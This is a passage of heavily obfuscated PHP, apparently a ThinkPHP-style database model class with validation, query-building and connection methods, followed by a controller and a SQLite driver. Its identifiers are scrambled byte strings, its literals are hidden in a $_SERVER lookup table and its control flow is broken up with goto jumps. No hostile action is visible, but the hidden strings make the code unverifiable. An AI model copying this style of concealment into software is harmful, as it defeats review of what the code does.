autoCheckToken($C¾õÊè¨Ã³) { $eÌ›òƒ¶¶ö =& $_SERVER[í…¶]; if (isset($this->options[$eÌ›òƒ¶¶ö[289]]) && !$this->options[$eÌ›òƒ¶¶ö[289]]) { return !0; } if (think_config($eÌ›òƒ¶¶ö[286])) { $eÃÊÔ³¤í = think_config($eÌ›òƒ¶¶ö[287]); if (!isset($C¾õÊè¨Ã³[$eÃÊÔ³¤í]) || Session::get($eÃÊÔ³¤í)) { return !1; } list($dİÍÑÌ»Ë¼, $Bğ­Ÿ´‡´¨) = explode($eÌ›òƒ¶¶ö[70], $C¾õÊè¨Ã³[$eÃÊÔ³¤í]); if ($Bğ­Ÿ´‡´¨ && Session::get($eÃÊÔ³¤í . $eÌ›òƒ¶¶ö[91] . $dİÍÑÌ»Ë¼) === $Bğ­Ÿ´‡´¨) { Session::remove($eÃÊÔ³¤í . $eÌ›òƒ¶¶ö[91] . $dİÍÑÌ»Ë¼); return !0; } if (think_config($eÌ›òƒ¶¶ö[290])) { Session::remove($eÃÊÔ³¤í . $eÌ›òƒ¶¶ö[91] . $dİÍÑÌ»Ë¼); } return !1; } return !0; } public function regex($Aœä·¬©ùİ, $d†‹“ƒîê—) { $EÏØÊ²Œà¥ =& $_SERVER[í…¶]; $b„–Í—Ù´º = array($EÏØÊ²Œà¥[291] => $EÏØÊ²Œà¥[292], $EÏØÊ²Œà¥[293] => $EÏØÊ²Œà¥[294], $EÏØÊ²Œà¥[295] => $EÏØÊ²Œà¥[296], $EÏØÊ²Œà¥[297] => $EÏØÊ²Œà¥[298], $EÏØÊ²Œà¥[299] => $EÏØÊ²Œà¥[300], $EÏØÊ²Œà¥[301] => $EÏØÊ²Œà¥[302], $EÏØÊ²Œà¥[303] => $EÏØÊ²Œà¥[304], $EÏØÊ²Œà¥[278] => $EÏØÊ²Œà¥[305], $EÏØÊ²Œà¥[306] => $EÏØÊ²Œà¥[307]); if (isset($b„–Í—Ù´º[strtolower($d†‹“ƒîê—)])) { $d†‹“ƒîê— = $b„–Í—Ù´º[strtolower($d†‹“ƒîê—)]; } return preg_match($d†‹“ƒîê—, $Aœä·¬©ùİ) === 1; } private function autoOperation(&$dõ÷éê¯¥÷, $B­“ªÔÑë®) { $A‘Š´£ÓšÏ =& $_SERVER[í…¶]; if (!empty($this->options[$A‘Š´£ÓšÏ[308]])) { $fÜÁÃ óğ = $this->options[$A‘Š´£ÓšÏ[308]]; unset($this->options[$A‘Š´£ÓšÏ[308]]); } elseif (!empty($this->_auto)) { $fÜÁÃ óğ = $this->_auto; } if (isset($fÜÁÃ óğ)) { foreach ($fÜÁÃ óğ as $A’Ñ¤Öº­Š) { if (empty($A’Ñ¤Öº­Š[2])) { $A’Ñ¤Öº­Š[2] = THINK_MODEL_INSERT; } if ($B­“ªÔÑë® == $A’Ñ¤Öº­Š[2] || $A’Ñ¤Öº­Š[2] == THINK_MODEL_BOTH) { switch (trim($A’Ñ¤Öº­Š[3])) { case $A‘Š´£ÓšÏ[309]: case $A‘Š´£ÓšÏ[310]: $B»Ü«Íô ¥ = isset($A’Ñ¤Öº­Š[4]) ? (array) $A’Ñ¤Öº­Š[4] : array(); if (isset($dõ÷éê¯¥÷[$A’Ñ¤Öº­Š[0]])) { array_unshift($B»Ü«Íô ¥, $dõ÷éê¯¥÷[$A’Ñ¤Öº­Š[0]]); } if ($A‘Š´£ÓšÏ[309] == $A’Ñ¤Öº­Š[3]) { $dõ÷éê¯¥÷[$A’Ñ¤Öº­Š[0]] = call_user_func_array($A’Ñ¤Öº­Š[1], $B»Ü«Íô ¥); } else { $dõ÷éê¯¥÷[$A’Ñ¤Öº­Š[0]] = call_user_func_array(array(&$this, $A’Ñ¤Öº­Š[1]), $B»Ü«Íô ¥); } break; case $A‘Š´£ÓšÏ[261]: $dõ÷éê¯¥÷[$A’Ñ¤Öº­Š[0]] = $dõ÷éê¯¥÷[$A’Ñ¤Öº­Š[1]]; break; case $A‘Š´£ÓšÏ[311]: if ($A‘Š´£ÓšÏ[33] === $dõ÷éê¯¥÷[$A’Ñ¤Öº­Š[0]]) { unset($dõ÷éê¯¥÷[$A’Ñ¤Öº­Š[0]]); } break; case $A‘Š´£ÓšÏ[312]: default: $dõ÷éê¯¥÷[$A’Ñ¤Öº­Š[0]] = $A’Ñ¤Öº­Š[1]; } if (!1 === $dõ÷éê¯¥÷[$A’Ñ¤Öº­Š[0]]) { unset($dõ÷éê¯¥÷[$A’Ñ¤Öº­Š[0]]); } } } } return $dõ÷éê¯¥÷; } protected function autoValidation($aÊàİßĞòº, $fæ£Æ§œÖ¦) { $c´ñ¢ßƒÜÚ =& $_SERVER[í…¶]; if (!empty($this->options[$c´ñ¢ßƒÜÚ[313]])) { $cçôÔ«ÜÉ = $this->options[$c´ñ¢ßƒÜÚ[313]]; unset($this->options[$c´ñ¢ßƒÜÚ[313]]); } elseif (!empty($this->_validate)) { $cçôÔ«ÜÉ = $this->_validate; } if (isset($cçôÔ«ÜÉ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($cçôÔ«ÜÉ as $B²¾—¥ßÛ => $FÒŠ™À¼¨ñ) { if (empty($FÒŠ™À¼¨ñ[5]) || $FÒŠ™À¼¨ñ[5] == THINK_MODEL_BOTH || $FÒŠ™À¼¨ñ[5] == $fæ£Æ§œÖ¦) { if (0 == strpos($FÒŠ™À¼¨ñ[2], $c´ñ¢ßƒÜÚ[314]) && strpos($FÒŠ™À¼¨ñ[2], $c´ñ¢ßƒÜÚ[315])) { $FÒŠ™À¼¨ñ[2] = think_lang(substr($FÒŠ™À¼¨ñ[2], 2, -1)); } $FÒŠ™À¼¨ñ[3] = isset($FÒŠ™À¼¨ñ[3]) ? $FÒŠ™À¼¨ñ[3] : THINK_EXISTS_VALIDATE; $FÒŠ™À¼¨ñ[4] = isset($FÒŠ™À¼¨ñ[4]) ? $FÒŠ™À¼¨ñ[4] : $c´ñ¢ßƒÜÚ[316]; switch ($FÒŠ™À¼¨ñ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($aÊàİßĞòº, $FÒŠ™À¼¨ñ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($c´ñ¢ßƒÜÚ[33] != trim($aÊàİßĞòº[$FÒŠ™À¼¨ñ[0]])) { if (!1 === $this->_validationField($aÊàİßĞòº, $FÒŠ™À¼¨ñ)) { return !1; } } break; default: if (isset($aÊàİßĞòº[$FÒŠ™À¼¨ñ[0]])) { if (!1 === $this->_validationField($aÊàİßĞòº, $FÒŠ™À¼¨ñ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($cíÎšŒµÍ¸, $Aİåù®ŞôÖ) { if (!1 === $this->_validationFieldItem($cíÎšŒµÍ¸, $Aİåù®ŞôÖ)) { if ($this->patchValidate) { $this->error[$Aİåù®ŞôÖ[0]] = $Aİåù®ŞôÖ[2]; } else { $this->error = $Aİåù®ŞôÖ[2]; return !1; } } return; } protected function _validationFieldItem($c®Ê—Ãå÷ö, $E†œ‰™–ô) { $f«“Ÿ£ÒÍ“ =& $_SERVER[í…¶]; switch (strtolower(trim($E†œ‰™–ô[4]))) { case $f«“Ÿ£ÒÍ“[309]: case $f«“Ÿ£ÒÍ“[310]: $bÜ±Ì²¨ÉÛ = isset($E†œ‰™–ô[6]) ? (array) $E†œ‰™–ô[6] : array(); if (is_string($E†œ‰™–ô[0]) && strpos($E†œ‰™–ô[0], $f«“Ÿ£ÒÍ“[47])) { $E†œ‰™–ô[0] = explode($f«“Ÿ£ÒÍ“[47], $E†œ‰™–ô[0]); } if (is_array($E†œ‰™–ô[0])) { foreach ($E†œ‰™–ô[0] as $fÏ§âÀÎ) { $bÄìÆ§–ëÑ[$fÏ§âÀÎ] = $c®Ê—Ãå÷ö[$fÏ§âÀÎ]; } array_unshift($bÜ±Ì²¨ÉÛ, $bÄìÆ§–ëÑ); } else { array_unshift($bÜ±Ì²¨ÉÛ, $c®Ê—Ãå÷ö[$E†œ‰™–ô[0]]); } if ($f«“Ÿ£ÒÍ“[309] == $E†œ‰™–ô[4]) { return call_user_func_array($E†œ‰™–ô[1], $bÜ±Ì²¨ÉÛ); } else { return call_user_func_array(array(&$this, $E†œ‰™–ô[1]), $bÜ±Ì²¨ÉÛ); } case $f«“Ÿ£ÒÍ“[317]: return $c®Ê—Ãå÷ö[$E†œ‰™–ô[0]] == $c®Ê—Ãå÷ö[$E†œ‰™–ô[1]]; case $f«“Ÿ£ÒÍ“[318]: if (is_string($E†œ‰™–ô[0]) && strpos($E†œ‰™–ô[0], $f«“Ÿ£ÒÍ“[47])) { $E†œ‰™–ô[0] = explode($f«“Ÿ£ÒÍ“[47], $E†œ‰™–ô[0]); } $dƒÌÎß‚¬Ñ = array(); if (is_array($E†œ‰™–ô[0])) { foreach ($E†œ‰™–ô[0] as $fÏ§âÀÎ) { $dƒÌÎß‚¬Ñ[$fÏ§âÀÎ] = $c®Ê—Ãå÷ö[$fÏ§âÀÎ]; } } else { $dƒÌÎß‚¬Ñ[$E†œ‰™–ô[0]] = $c®Ê—Ãå÷ö[$E†œ‰™–ô[0]]; } if (!empty($c®Ê—Ãå÷ö[$this->getPk()])) { $dƒÌÎß‚¬Ñ[$this->getPk()] = array($f«“Ÿ£ÒÍ“[319], $c®Ê—Ãå÷ö[$this->getPk()]); } if ($this->where($dƒÌÎß‚¬Ñ)->find()) { return !1; } return !0; default: return $this->check($c®Ê—Ãå÷ö[$E†œ‰™–ô[0]], $E†œ‰™–ô[1], $E†œ‰™–ô[4]); } } public function check($A Œ…×­—, $d‡ìô±í¦¬, $aš™àÀ˜Û‰ = "\162\145\x67\x65\170") { $c‘ºÌ’«Ö… =& $_SERVER[í…¶]; $aš™àÀ˜Û‰ = strtolower(trim($aš™àÀ˜Û‰)); switch ($aš™àÀ˜Û‰) { case $c‘ºÌ’«Ö…[7]: case $c‘ºÌ’«Ö…[320]: $C»åËï¿… = is_array($d‡ìô±í¦¬) ? $d‡ìô±í¦¬ : explode($c‘ºÌ’«Ö…[47], $d‡ìô±í¦¬); return $aš™àÀ˜Û‰ == $c‘ºÌ’«Ö…[7] ? in_array($A Œ…×­—, $C»åËï¿…) : !in_array($A Œ…×­—, $C»åËï¿…); case $c‘ºÌ’«Ö…[321]: case $c‘ºÌ’«Ö…[322]: if (is_array($d‡ìô±í¦¬)) { $fç¸ÖŒàæÈ = $d‡ìô±í¦¬[0]; $aÛ‡µÆİò‹ = $d‡ìô±í¦¬[1]; } else { list($fç¸ÖŒàæÈ, $aÛ‡µÆİò‹) = explode($c‘ºÌ’«Ö…[47], $d‡ìô±í¦¬); } return $aš™àÀ˜Û‰ == $c‘ºÌ’«Ö…[321] ? $A Œ…×­— >= $fç¸ÖŒàæÈ && $A Œ…×­— <= $aÛ‡µÆİò‹ : $A Œ…×­— < $fç¸ÖŒàæÈ || $A Œ…×­— > $aÛ‡µÆİò‹; case $c‘ºÌ’«Ö…[323]: case $c‘ºÌ’«Ö…[324]: return $aš™àÀ˜Û‰ == $c‘ºÌ’«Ö…[323] ? $A Œ…×­— == $d‡ìô±í¦¬ : $A Œ…×­— != $d‡ìô±í¦¬; case $c‘ºÌ’«Ö…[325]: $A‘É‡ËÅîß = mb_strlen($A Œ…×­—, $c‘ºÌ’«Ö…[326]); if (strpos($d‡ìô±í¦¬, $c‘ºÌ’«Ö…[47])) { list($fç¸ÖŒàæÈ, $aÛ‡µÆİò‹) = explode($c‘ºÌ’«Ö…[47], $d‡ìô±í¦¬); return $A‘É‡ËÅîß >= $fç¸ÖŒàæÈ && $A‘É‡ËÅîß <= $aÛ‡µÆİò‹; } else { return $A‘É‡ËÅîß == $d‡ìô±í¦¬; } case $c‘ºÌ’«Ö…[327]: list($dÉÅ¤ğäêÙ, $Eé›…¤¤Ü) = explode($c‘ºÌ’«Ö…[47], $d‡ìô±í¦¬); if (!is_numeric($dÉÅ¤ğäêÙ)) { $dÉÅ¤ğäêÙ = strtotime($dÉÅ¤ğäêÙ); } if (!is_numeric($Eé›…¤¤Ü)) { $Eé›…¤¤Ü = strtotime($Eé›…¤¤Ü); } return NOW_TIME >= $dÉÅ¤ğäêÙ && NOW_TIME <= $Eé›…¤¤Ü; case $c‘ºÌ’«Ö…[328]: return in_array(get_client_ip(), explode($c‘ºÌ’«Ö…[47], $d‡ìô±í¦¬)); case $c‘ºÌ’«Ö…[329]: return !in_array(get_client_ip(), explode($c‘ºÌ’«Ö…[47], $d‡ìô±í¦¬)); case $c‘ºÌ’«Ö…[316]: default: return $this->regex($A Œ…×­—, $d‡ìô±í¦¬); } } public function query($c± ÀÍŞ®, $b·¹²‘Ê­‚ = false) { $D éĞè—é’ =& $_SERVER[í…¶]; if (!is_bool($b·¹²‘Ê­‚) && !is_array($b·¹²‘Ê­‚)) { $b·¹²‘Ê­‚ = func_get_args(); array_shift($b·¹²‘Ê­‚); } $c± ÀÍŞ® = str_replace(array($D éĞè—é’[217], $D éĞè—é’[330]), $D éĞè—é’[50], $c± ÀÍŞ®); $c± ÀÍŞ® = $this->parseSql($c± ÀÍŞ®, $b·¹²‘Ê­‚); return $this->db->query($c± ÀÍŞ®); } public function execute($Aİ±šäÛ, $bó–„Ç¸·§ = false) { if (!is_bool($bó–„Ç¸·§) && !is_array($bó–„Ç¸·§)) { $bó–„Ç¸·§ = func_get_args(); array_shift($bó–„Ç¸·§); } $Aİ±šäÛ = $this->parseSql($Aİ±šäÛ, $bó–„Ç¸·§); return $this->db->execute($Aİ±šäÛ); } protected function parseSql($B÷¢ó°·¹§, $FÊ¸¢…¿â) { $Cğ·‘£ƒ™± =& $_SERVER[í…¶]; if (!0 === $FÊ¸¢…¿â) { $D½”¸Íí¸á = $this->_parseOptions(); $B÷¢ó°·¹§ = $this->db->parseSql($B÷¢ó°·¹§, $D½”¸Íí¸á); } elseif (is_array($FÊ¸¢…¿â)) { $FÊ¸¢…¿â = array_map(array($this->db, $Cğ·‘£ƒ™±[331]), $FÊ¸¢…¿â); $B÷¢ó°·¹§ = vsprintf($B÷¢ó°·¹§, $FÊ¸¢…¿â); } else { $B÷¢ó°·¹§ = strtr($B÷¢ó°·¹§, array($Cğ·‘£ƒ™±[332] => $this->getTableName(), $Cğ·‘£ƒ™±[333] => think_config($Cğ·‘£ƒ™±[232]))); } $this->db->setModel($this->name); return $B÷¢ó°·¹§; } public function db($FÎ·é‡Äê = '', $A¨¡‡ËäËˆ = '', $fñ‘Ì„¹ù = array()) { goto F­êÈÈ¨¤; EÊœ¬£·‡È: $bİĞ¡õ¢¶£[$FÎ·é‡Äê] = $A¨¡‡ËäËˆ; $this->db = $Cƒ§’‹¾°[$FÎ·é‡Äê]; $this->_after_db(); goto B—Õ £èëø; fªæ¸™ó²‹: static $Cƒ§’‹¾° = array(); if (!isset($Cƒ§’‹¾°[$FÎ·é‡Äê]) || isset($Cƒ§’‹¾°[$FÎ·é‡Äê]) && $A¨¡‡ËäËˆ && $bİĞ¡õ¢¶£[$FÎ·é‡Äê] != $A¨¡‡ËäËˆ) { if (!empty($A¨¡‡ËäËˆ) && is_string($A¨¡‡ËäËˆ) && !1 === strpos($A¨¡‡ËäËˆ, $cÖªœ‰ƒ‚œ[8])) { $A¨¡‡ËäËˆ = think_config($A¨¡‡ËäËˆ); } $Cƒ§’‹¾°[$FÎ·é‡Äê] = Db::getInstance($A¨¡‡ËäËˆ); } elseif (NULL === $A¨¡‡ËäËˆ) { $Cƒ§’‹¾°[$FÎ·é‡Äê]->close(); unset($Cƒ§’‹¾°[$FÎ·é‡Äê]); return; } if (!empty($fñ‘Ì„¹ù)) { if (is_string($fñ‘Ì„¹ù)) { parse_str($fñ‘Ì„¹ù, $fñ‘Ì„¹ù); } foreach ($fñ‘Ì„¹ù as $e¿˜±¦£™ => $eËñèèÎŞ¼) { $this->setProperty($e¿˜±¦£™, $eËñèèÎŞ¼); } } goto EÊœ¬£·‡È; B—Õ £èëø: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto bñ’Õ¶¼Â¥; F­êÈÈ¨¤: $cÖªœ‰ƒ‚œ =& $_SERVER[í…¶]; if ($cÖªœ‰ƒ‚œ[33] === $FÎ·é‡Äê && $this->db) { return $this->db; } static $bİĞ¡õ¢¶£ = array(); goto fªæ¸™ó²‹; bñ’Õ¶¼Â¥: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $f²®Š¿ìÆÃ = get_class($this); if ($f²®Š¿ìÆÃ == $_SERVER[í…¶][334]) { return $this->name; } $this->name = substr($f²®Š¿ìÆÃ, 0, -5); } return $this->name; } public function getTableName() { $Aã¨ÃôÓ¦– =& $_SERVER[í…¶]; if (empty($this->trueTableName)) { $e¯›Ö¼¨÷¨ = !empty($this->tablePrefix) ? $this->tablePrefix : $Aã¨ÃôÓ¦–[33]; if (!empty($this->tableName)) { $e¯›Ö¼¨÷¨ .= $this->tableName; } else { $e¯›Ö¼¨÷¨ .= think_parse_name($this->name); } $this->trueTableName = strtolower($e¯›Ö¼¨÷¨); } return (!empty($this->dbName) ? $this->dbName . $Aã¨ÃôÓ¦–[91] : $Aã¨ÃôÓ¦–[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $D‹ŞóĞæÍ =& $_SERVER[í…¶]; return isset($this->fields[$D‹ŞóĞæÍ[239]]) ? $this->fields[$D‹ŞóĞæÍ[239]] : $this->pk; } public function getDbFields() { $aê¼…­ÏÍÚ =& $_SERVER[í…¶]; if (isset($this->options[$aê¼…­ÏÍÚ[267]])) { $Bá™¯±šÃ = $this->db->getFields($this->options[$aê¼…­ÏÍÚ[267]]); return $Bá™¯±šÃ ? array_keys($Bá™¯±šÃ) : !1; } if ($this->fields) { $Bá™¯±šÃ = $this->fields; unset($Bá™¯±šÃ[$aê¼…­ÏÍÚ[238]], $Bá™¯±šÃ[$aê¼…­ÏÍÚ[239]], $Bá™¯±šÃ[$aê¼…­ÏÍÚ[240]], $Bá™¯±šÃ[$aê¼…­ÏÍÚ[237]]); return $Bá™¯±šÃ; } return !1; } public function data($eÂ‘¤ Ûó¸ = '') { $Bâ—Š‰ÀÈˆ =& $_SERVER[í…¶]; if ($Bâ—Š‰ÀÈˆ[33] === $eÂ‘¤ Ûó¸ && !empty($this->data)) { return $this->data; } if (is_object($eÂ‘¤ Ûó¸)) { $eÂ‘¤ Ûó¸ = get_object_vars($eÂ‘¤ Ûó¸); } elseif (is_string($eÂ‘¤ Ûó¸)) { parse_str($eÂ‘¤ Ûó¸, $eÂ‘¤ Ûó¸); } elseif (!is_array($eÂ‘¤ Ûó¸)) { think_exception(think_lang($Bâ—Š‰ÀÈˆ[259])); } $this->data = $eÂ‘¤ Ûó¸; return $this; } public function join($c²Ä‚á‰­) { $E‹÷÷±‘ÅŠ =& $_SERVER[í…¶]; if (is_array($c²Ä‚á‰­)) { $this->options[$E‹÷÷±‘ÅŠ[270]] = $c²Ä‚á‰­; } elseif (!empty($c²Ä‚á‰­)) { $this->options[$E‹÷÷±‘ÅŠ[270]][] = $c²Ä‚á‰­; } return $this; } public function union($E½¼ËÉÎß–, $A©Û‡Ò¯ÉÑ = false) { goto EÔõÙæÉ¾Š; bòæœé: return $this; goto b¨õñ²Æ›ğ; C¶á†™×‰‡: if (is_object($E½¼ËÉÎß–)) { $E½¼ËÉÎß– = get_object_vars($E½¼ËÉÎß–); } if (is_string($E½¼ËÉÎß–)) { $BŸñ›ğ„ˆÒ = $E½¼ËÉÎß–; } elseif (is_array($E½¼ËÉÎß–)) { if (isset($E½¼ËÉÎß–[0])) { $this->options[$B¡”ÃˆëÅ“[335]] = array_merge($this->options[$B¡”ÃˆëÅ“[335]], $E½¼ËÉÎß–); return $this; } else { $BŸñ›ğ„ˆÒ = $E½¼ËÉÎß–; } } else { think_exception(think_lang($B¡”ÃˆëÅ“[259])); } $this->options[$B¡”ÃˆëÅ“[335]][] = $BŸñ›ğ„ˆÒ; goto bòæœé; EÔõÙæÉ¾Š: $B¡”ÃˆëÅ“ =& $_SERVER[í…¶]; if (empty($E½¼ËÉÎß–)) { return $this; } if ($A©Û‡Ò¯ÉÑ) { $this->options[$B¡”ÃˆëÅ“[335]][$B¡”ÃˆëÅ“[336]] = !0; } goto C¶á†™×‰‡; b¨õñ²Æ›ğ: } public function cache($F÷ÀÌª§Óƒ = true, $Aã¼ÓÄò†© = null, $DÛÛ†Ë«·¹ = '') { $f™Éª¹öá =& $_SERVER[í…¶]; if (!1 !== $F÷ÀÌª§Óƒ) { $this->options[$f™Éª¹öá[337]] = array($f™Éª¹öá[89] => $F÷ÀÌª§Óƒ, $f™Éª¹öá[327] => $Aã¼ÓÄò†©, $f™Éª¹öá[29] => $DÛÛ†Ë«·¹); } return $this; } public function field($Aù×Ÿè©äë, $EŒÌ›¦œŞ = false) { $AàªœŒŠ˜ =& $_SERVER[í…¶]; if (!0 === $Aù×Ÿè©äë) { $BÏÀëëŞ°Ù = $this->getDbFields(); $Aù×Ÿè©äë = $BÏÀëëŞ°Ù ? $BÏÀëëŞ°Ù : $AàªœŒŠ˜[176]; } elseif ($EŒÌ›¦œŞ) { if (is_string($Aù×Ÿè©äë)) { $Aù×Ÿè©äë = explode($AàªœŒŠ˜[47], $Aù×Ÿè©äë); } $BÏÀëëŞ°Ù = $this->getDbFields(); $Aù×Ÿè©äë = $BÏÀëëŞ°Ù ? array_diff($BÏÀëëŞ°Ù, $Aù×Ÿè©äë) : $Aù×Ÿè©äë; } $this->options[$AàªœŒŠ˜[261]] = $Aù×Ÿè©äë; return $this; } public function scope($AÍ³–¼²… = '', $f„Š­¦Ò›Ú = NULL) { $CÑùÃ”â¼ä =& $_SERVER[í…¶]; if ($CÑùÃ”â¼ä[33] === $AÍ³–¼²…) { if (isset($this->_scope[$CÑùÃ”â¼ä[34]])) { $F¯µ¸Š®ÈÅ = $this->_scope[$CÑùÃ”â¼ä[34]]; } else { return $this; } } elseif (is_string($AÍ³–¼²…)) { $bÂ—¡Æİ = explode($CÑùÃ”â¼ä[47], $AÍ³–¼²…); $F¯µ¸Š®ÈÅ = array(); foreach ($bÂ—¡Æİ as $bÈŞî‰Š½ë) { if (!isset($this->_scope[$bÈŞî‰Š½ë])) { continue; } $F¯µ¸Š®ÈÅ = array_merge($F¯µ¸Š®ÈÅ, $this->_scope[$bÈŞî‰Š½ë]); } if (!empty($f„Š­¦Ò›Ú) && is_array($f„Š­¦Ò›Ú)) { $F¯µ¸Š®ÈÅ = array_merge($F¯µ¸Š®ÈÅ, $f„Š­¦Ò›Ú); } } elseif (is_array($AÍ³–¼²…)) { $F¯µ¸Š®ÈÅ = $AÍ³–¼²…; } if (is_array($F¯µ¸Š®ÈÅ) && !empty($F¯µ¸Š®ÈÅ)) { $this->options = array_merge($this->options, array_change_key_case($F¯µ¸Š®ÈÅ)); } return $this; } public function where($A‘àÕÆ’­Â, $c›Ö§ÜŸÚÙ = null) { $AİöÓˆ·…ƒ =& $_SERVER[í…¶]; if (!is_null($c›Ö§ÜŸÚÙ) && is_string($A‘àÕÆ’­Â)) { if (!is_array($c›Ö§ÜŸÚÙ)) { $c›Ö§ÜŸÚÙ = func_get_args(); array_shift($c›Ö§ÜŸÚÙ); } $c›Ö§ÜŸÚÙ = array_map(array($this->db, $AİöÓˆ·…ƒ[331]), $c›Ö§ÜŸÚÙ); $A‘àÕÆ’­Â = vsprintf($A‘àÕÆ’­Â, $c›Ö§ÜŸÚÙ); } elseif (is_object($A‘àÕÆ’­Â)) { $A‘àÕÆ’­Â = get_object_vars($A‘àÕÆ’­Â); } elseif (is_array($A‘àÕÆ’­Â)) { foreach ($A‘àÕÆ’­Â as $Dº‚–µªŠÃ => $bÛèê‚¢Üî) { if ((is_numeric($Dº‚–µªŠÃ) || !$Dº‚–µªŠÃ) && is_string($bÛèê‚¢Üî)) { think_trace($AİöÓˆ·…ƒ[338], $AİöÓˆ·…ƒ[33], $AİöÓˆ·…ƒ[46]); die; } } } if (is_string($A‘àÕÆ’­Â) && $AİöÓˆ·…ƒ[33] != $A‘àÕÆ’­Â) { $Fâß¥ˆºŞ = array(); $Fâß¥ˆºŞ[$AİöÓˆ·…ƒ[339]] = $A‘àÕÆ’­Â; $A‘àÕÆ’­Â = $Fâß¥ˆºŞ; } if (isset($this->options[$AİöÓˆ·…ƒ[263]])) { $this->options[$AİöÓˆ·…ƒ[263]] = array_merge($this->options[$AİöÓˆ·…ƒ[263]], $A‘àÕÆ’­Â); } else { $this->options[$AİöÓˆ·…ƒ[263]] = $A‘àÕÆ’­Â; } return $this; } public function limit($Fä°–ƒ¼â, $Eó¬åŒ…‰ = null) { $F“¥Ö¬²Ô =& $_SERVER[í…¶]; $this->options[$F“¥Ö¬²Ô[280]] = is_null($Eó¬åŒ…‰) ? $Fä°–ƒ¼â : $Fä°–ƒ¼â . $F“¥Ö¬²Ô[47] . $Eó¬åŒ…‰; return $this; } public function page($CÔö®ÆŠí³, $a«‚¥çà© = null) { $d³ãÈ…¥ŒÆ =& $_SERVER[í…¶]; $this->options[$d³ãÈ…¥ŒÆ[340]] = is_null($a«‚¥çà©) ? $CÔö®ÆŠí³ : $CÔö®ÆŠí³ . $d³ãÈ…¥ŒÆ[47] . $a«‚¥çà©; return $this; } public function comment($BˆìÏ¨‘ÛÊ) { $this->options[$_SERVER[í…¶][341]] = $BˆìÏ¨‘ÛÊ; return $this; } public function setProperty($cÌ¡Õ‰×‹š, $aˆ±ôÉè©) { if (property_exists($this, $cÌ¡Õ‰×‹š)) { $this->{$cÌ¡Õ‰×‹š} = $aˆ±ôÉè©; } return $this; } } goto Eùï¦¦¹å; bÒ°•©•‚á: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto aÅÙ…™Š½Û; aÅÙ…™Š½Û: $C¶ß¡¬êåë =& $_SERVER[í…¶]; global $in, $config; $this->config =& $config; goto CƒÅ“ÆÅ¿Û; CƒÅ“ÆÅ¿Û: $this->in =& $in; $this->values[$C¶ß¡¬êåë[6]] =& $config; $this->values[$C¶ß¡¬êåë[7]] =& $in; goto CÓí¾†Ÿ•ä; CÓí¾†Ÿ•ä: $this->tpl = TEMPLATE . MOD . $C¶ß¡¬êåë[8]; $this->_classObjectID = mt_rand(0, 10000); goto B¦˜ô¬Ì“¢; B¦˜ô¬Ì“¢: } public function loadClass($aèùá÷…ğ) { if (1 === func_num_args()) { $this->{$aèùá÷…ğ} = new $aèùá÷…ğ(); } else { $CäŠó­‘ÕŸ = new ReflectionClass($aèùá÷…ğ); $E­Ë„êÜ¿½ = func_get_args(); array_shift($E­Ë„êÜ¿½); $this->{$aèùá÷…ğ} = $CäŠó­‘ÕŸ->newInstanceArgs($E­Ë„êÜ¿½); } return $this->{$aèùá÷…ğ}; } protected function assign($d‡ì†ÉŸø, $bÔÏè™Ì¡˜) { $this->values[$d‡ì†ÉŸø] = $bÔÏè™Ì¡˜; } protected function display($bÕŸöÛ½) { ob_end_clean(); extract($this->values); require $this->tpl . $bÕŸöÛ½; } } class DbSqliteBase extends Db { public function __construct($BŒßØ¾Ğ™° = '') { $aÀ¾óÄğÈĞ =& $_SERVER[í…¶]; if (!extension_loaded($aÀ¾óÄğÈĞ[9])) { think_exception(think_lang($aÀ¾óÄğÈĞ[10]) . $aÀ¾óÄğÈĞ[11]); } if (!empty($BŒßØ¾Ğ™°)) { if (!isset($BŒßØ¾Ğ™°[$aÀ¾óÄğÈĞ[12]])) { $BŒßØ¾Ğ™°[$aÀ¾óÄğÈĞ[12]] = 438; } $this->config = $BŒßØ¾Ğ™°; if (empty($this->config[$aÀ¾óÄğÈĞ[13]])) { $this->config[$aÀ¾óÄğÈĞ[13]] = array(); } } } public function connect($AæŞ¿•ÓÅ¥ = '', $bö…“Óñ‰ = 0) { $a™…çõ‘Ÿ =& $_SERVER[í…¶]; if (!isset($this->linkID[$bö…“Óñ‰])) { goto dƒ‘Ù„¦æ; a¾êÑ„Ãæ¤: $this->linkID[$bö…“Óñ‰] = $bÕÄ‰Üä­Œ($AæŞ¿•ÓÅ¥[$a™…çõ‘Ÿ[17]], $AæŞ¿•ÓÅ¥[$a™…çõ‘Ÿ[12]]); if (!$this->linkID[$bö…“Óñ‰]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto E‰„âåæ¹Ğ; dƒ‘Ù„¦æ: if (empty($AæŞ¿•ÓÅ¥)) { $AæŞ¿•ÓÅ¥ = $this->config; } $eÉ„—®‡ÀÊ = !empty($AæŞ¿•ÓÅ¥[$a™…çõ‘Ÿ[13]][$a™…çõ‘Ÿ[14]]) ? $AæŞ¿•ÓÅ¥[$a™…çõ‘Ÿ[13]][$a™…çõ‘Ÿ[14]] : $this->pconnect; $bÕÄ‰Üä­Œ = $eÉ„—®‡ÀÊ ? $a™…çõ‘Ÿ[15] : $a™…çõ‘Ÿ[16]; goto a¾êÑ„Ãæ¤; E‰„âåæ¹Ğ: @sqlite_busy_timeout($this->linkID[$bö…“Óñ‰], 30000); if (1 != think_config($a™…çõ‘Ÿ[18])) { unset($this->config); } goto A‹¹ÊéŒÔ‡; A‹¹ÊéŒÔ‡: } return $this->linkID[$bö…“Óñ‰]; } public function free() { $this->queryID = null; } public function query($CãŞ‹¨ªœ) { goto Dì¢ƒ˜§ÃË; Bãè¤ì„…: think_status($a©©òç›£‹[20]); $this->queryID = sqlite_query($this->_linkID, $CãŞ‹¨ªœ); $this->debug(); goto E¹‚œˆ¿; 